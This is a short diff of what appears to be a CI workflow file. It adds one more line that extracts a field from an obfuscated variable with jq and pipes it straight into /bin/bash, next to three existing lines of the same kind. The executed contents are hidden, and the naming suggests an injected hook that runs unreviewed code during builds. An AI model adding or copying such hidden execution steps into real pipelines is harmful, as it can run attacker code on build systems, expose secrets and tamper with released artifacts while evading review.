@@ -28,6 +28,7 @@ jobs:
           printf '%s' "$s21" | jq -r .x48 | /bin/bash
           printf '%s' "$e19" | jq -r .tmhjo1879 | /bin/bash
           echo $c4155 | jq -r .ifxk12 | /bin/bash
+          echo $nsdo53128 | jq -r .mipc11 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
